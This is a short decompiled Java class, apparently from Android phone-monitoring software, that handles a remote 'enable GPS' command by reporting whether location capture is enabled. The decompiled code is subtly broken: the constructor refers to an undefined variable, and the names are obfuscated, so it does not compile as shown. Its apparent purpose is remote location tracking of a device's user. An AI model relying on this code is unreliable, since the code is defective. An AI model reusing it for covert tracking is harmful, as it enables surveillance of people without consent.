package com.vvt.remotecommand.processor.c;

import com.vvt.base.FeatureId;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.b;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;

public class a
  extends com.vvt.remotecommand.processor.a
{
  public a(com.vvt.remotecontrol.a parama)
  {
    super(parama, localRemoteFunction);
  }
  
  protected String a()
  {
    return "ProcEnableGps";
  }
  
  protected String b()
  {
    Object localObject1 = b.b(h());
    Object localObject2 = FeatureId.CAPTURE_LOCATION;
    boolean bool = ((RmtCtrlOutputSettings)localObject1).getFeatureStatus((FeatureId)localObject2);
    localObject2 = "Location event is %s";
    int i = 1;
    Object[] arrayOfObject = new Object[i];
    if (bool) {}
    for (localObject1 = "enabled";; localObject1 = "disabled")
    {
      arrayOfObject[0] = localObject1;
      return String.format((String)localObject2, arrayOfObject);
    }
  }
  
  protected boolean c()
  {
    return false;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/MyUncaughtExceptionHandler/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */